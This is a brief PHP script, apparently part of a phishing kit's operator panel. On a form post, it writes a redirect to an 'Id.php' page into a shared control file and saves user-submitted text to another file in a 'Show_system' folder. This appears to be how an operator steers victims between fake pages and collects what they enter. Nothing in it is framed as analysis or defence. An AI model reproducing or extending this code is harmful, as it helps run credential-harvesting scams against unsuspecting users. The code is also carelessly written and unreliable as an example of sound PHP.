<?php


session_start();

if(isset($_POST['imagee'])) 
{
    
$Page = ' <meta http-equiv="refresh" content="0;url=./Id.php" /> ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);



$textimage = $_SESSION['textimage'] = $_POST['textimage'];

$yagmai .= ''.$textimage.'';

$f = fopen("../Show_system/Show_Id.txt", "w");
    fwrite($f, $yagmai);




}

else {




}

?>

